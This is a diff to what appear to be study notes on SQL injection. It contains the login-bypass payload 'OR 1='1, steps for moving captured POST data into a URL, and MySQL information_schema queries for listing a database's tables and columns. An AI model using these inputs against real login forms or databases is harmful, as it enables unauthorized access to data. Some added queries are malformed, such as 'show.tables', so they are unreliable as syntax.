@@ -85,9 +85,24 @@ OR
 F12 > Network Tab
 > Username: 'OR 1='1
 > Password: 'OR 1='1
-Click Methos: Post > Request on Left > Toggle Raw data
+Click Method: Post > Request on Right Pane > Toggle Raw data
 Copy, add to url as a variable by adding a ?
 ********************************************************************************
+
+****************************--DEMO - DATABASE INTERACTIONS--********************************************
+mysql
+##GOLDEN STATEMENT
+select table_schema,table_name,column_name from information_schema.columns ;
+       <NAME OF COLUMN>,<NAME OF COLUMN>,<NAME OF COLUMN> from <NAME OF DATABASE>.<NAME OF TABLE>
+use information_schema ;
+show.tables ;
+show columns from columns ;
+                     ^
+                   table
+##DEFAULT DATABASES
+information_schema
+performance_schema
+mysql
 
 
 
